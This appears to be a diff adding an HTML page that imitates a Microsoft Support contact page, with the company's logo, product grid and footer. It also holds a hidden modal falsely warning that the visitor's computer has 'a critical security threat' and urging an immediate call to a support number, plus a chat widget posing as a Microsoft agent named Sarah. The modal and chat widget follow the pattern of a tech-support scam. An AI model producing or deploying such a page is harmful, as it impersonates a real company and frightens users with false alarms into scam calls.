@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Support</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="nav-wrapper">
+                <div class="logo">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="11" height="11" fill="#f25022"/>
+                        <rect x="13" width="11" height="11" fill="#7fba00"/>
+                        <rect y="13" width="11" height="11" fill="#00a4ef"/>
+                        <rect x="13" y="13" width="11" height="11" fill="#ffb900"/>
+                    </svg>
+                    <span class="logo-text">Microsoft</span>
+                </div>
+                <nav class="nav">
+                    <ul class="nav-list">
+                        <li><a href="#" class="nav-link">Products</a></li>
+                        <li><a href="#" class="nav-link">Support</a></li>
+                        <li><a href="#" class="nav-link">Contact</a></li>
+                    </ul>
+                </nav>
+                <div class="user-actions">
+                    <button class="btn-secondary">Sign in</button>
+                </div>
+            </div>
+        </div>
+    </header>
+    <main>
+        <section class="contact-hero">
+            <div class="container">
+                <div class="contact-content">
+                    <h1>Contact us</h1>
+                    <p>Sign in so we can get you the right help and support.</p>
+                    <div class="sign-in-container">
+                        <button class="btn-sign-in" id="signInBtn">Sign in</button>
+                        <a href="#" class="cant-sign-in">Can't sign in</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <section class="product-selection">
+            <div class="container">
+                <h2>Select the product you need help with</h2>
+                <p class="selection-subtitle">We'll show you self-help options first. Additional help is available if you need it, including live chat with a Microsoft specialist.</p>
+                <div class="products-grid">
+                    <div class="product-card" data-product="microsoft365">
+                        <div class="product-icon">
+                            <img src="https://support.microsoft.com/ems/content/images/appicons/microsoft365.64x64.svg" alt="Microsoft 365">
+                        </div>
+                        <span class="product-name">Microsoft 365</span>
+                    </div>
+                    <div class="product-card" data-product="office">
+                        <div class="product-icon">
+                            <img src="https://support.microsoft.com/ems/content/images/appicons/office.64x64x32.png" alt="Office">
+                        </div>
+                        <span class="product-name">Office</span>
+                    </div>
+                    <div class="product-card" data-product="windows">
+                        <div class="product-icon">
+                            <img src="https://support.microsoft.com/ems/content/images/appicons/windows.64x64x32.png" alt="Windows">
+                        </div>
+                        <span class="product-name">Windows</span>
+                    </div>
+                    <div class="product-card" data-product="xbox">
+                        <div class="product-icon">
+                            <img src="https://support.microsoft.com/ems/content/images/appicons/xbox.64x64x32.png" alt="Xbox">
+                        </div>
+                        <span class="product-name">Xbox</span>
+                    </div>
+                    <div class="product-card" data-product="surface">
+                        <div class="product-icon">
+                            <img src="https://support.microsoft.com/ems/content/images/appicons/surface.64x64.png" alt="Surface devices">
+                        </div>
+                        <span class="product-name">Surface devices</span>
+                    </div>
+                    <div class="product-card" data-product="copilot">
+                        <div class="product-icon">
+                            <img src="https://support.microsoft.com/ems/content/images/appicons/copilot.64x64px.png" alt="Copilot">
+                        </div>
+                        <span class="product-name">Copilot</span>
+                    </div>
+                    <div class="product-card" data-product="dynamics">
+                        <div class="product-icon">
+                            <img src="https://support.microsoft.com/ems/content/images/appicons/dynamics365.64x64x32.png" alt="Dynamics 365">
+                        </div>
+                        <span class="product-name">Dynamics 365</span>
+                    </div>
+                    <div class="product-card" data-product="intune">
+                        <div class="product-icon">
+                            <img src="https://support.microsoft.com/ems/content/images/appicons/intune.64x64x32.png" alt="Intune">
+                        </div>
+                        <span class="product-name">Intune</span>
+                    </div>
+                    <div class="product-card" data-product="azure">
+                        <div class="product-icon">
+                            <img src="https://support.microsoft.com/ems/content/images/appicons/azure.64x64x32.png" alt="Azure">
+                        </div>
+                        <span class="product-name">Azure</span>
+                    </div>
+                    <div class="product-card" data-product="server">
+                        <div class="product-icon">
+                            <img src="https://support.microsoft.com/ems/content/images/appicons/serverproducts.64x64x32.png" alt="Server products">
+                        </div>
+                        <span class="product-name">Server products</span>
+                    </div>
+                    <div class="product-card" data-product="accessories">
+                        <div class="product-icon">
+                            <img src="https://support.microsoft.com/ems/content/images/appicons/appsgeneric.64x64x32.png" alt="PC accessories">
+                        </div>
+                        <span class="product-name">PC accessories</span>
+                    </div>
+                    <div class="product-card" data-product="advertising">
+                        <div class="product-icon">
+                            <img src="https://support.microsoft.com/ems/content/images/appicons/advertising.64x64.png" alt="Advertising">
+                        </div>
+                        <span class="product-name">Advertising</span>
+                    </div>
+                </div>
+                <div class="show-more">
+                    <a href="#" class="show-more-link">Show expanded list of products</a>
+                </div>
+            </div>
+        </section>
+        <section class="more-support">
+            <div class="container">
+                <h2>More support options</h2>
+                <div class="support-cards">
+                    <div class="support-card">
+                        <h3>Business Assist</h3>
+                        <p>Subscribe to Business Assist to get expert advice from small business specialists. Already a subscriber? <a href="#" class="inline-link">sign in now</a></p>
+                    </div>
+                    <div class="support-card">
+                        <h3>Help for admins of small businesses</h3>
+                        <p>Open a service request in the Microsoft 365 admin center. This service is free</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <div class="modal" id="errorModal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h3>System Error Detected</h3>
+                    <span class="close" id="closeModal">&times;</span>
+                </div>
+                <div class="modal-body">
+                    <div class="error-icon">⚠️</div>
+                    <p>Your computer has detected a critical security threat.</p>
+                    <p><strong>Error Code:</strong> <span id="errorCode">WIN-ERR-0x8007045D</span></p>
+                    <p>Please contact Microsoft Support immediately to resolve this issue.</p>
+                    <div class="contact-info">
+                        <p><strong>Support Number:</strong> <span class="phone-number">+1-800-642-7676</span></p>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn-danger" id="callNowBtn">Call Support Now</button>
+                    <button class="btn-secondary" id="ignoreBtn">Ignore Warning</button>
+                </div>
+            </div>
+        </div>
+        <div class="chat-widget" id="chatWidget">
+            <div class="chat-header">
+                <span>Microsoft Support Chat</span>
+                <button class="chat-close" id="chatClose">&times;</button>
+            </div>
+            <div class="chat-body" id="chatBody">
+                <div class="chat-message agent">
+                    <div class="message-content">
+                        Hello! I'm Sarah from Microsoft Support. How can I help you today?
+                    </div>
+                    <div class="message-time">Just now</div>
+                </div>
+            </div>
+            <div class="chat-input">
+                <input type="text" placeholder="Type your message..." id="chatInput">
+                <button id="sendChat">Send</button>
+            </div>
+        </div>
+    </main>
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h4>Products</h4>
+                    <ul>
+                        <li><a href="#">Windows</a></li>
+                        <li><a href="#">Office</a></li>
+                        <li><a href="#">Xbox</a></li>
+                        <li><a href="#">Surface</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Support</h4>
+                    <ul>
+                        <li><a href="#">Contact Support</a></li>
+                        <li><a href="#">Community</a></li>
+                        <li><a href="#">Documentation</a></li>
+                        <li><a href="#">Status</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Company</h4>
+                    <ul>
+                        <li><a href="#">About Microsoft</a></li>
+                        <li><a href="#">Careers</a></li>
+                        <li><a href="#">Privacy</a></li>
+                        <li><a href="#">Terms</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2025 Microsoft Corporation. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+    <script src="script.js"></script>
+</body>
+</html>
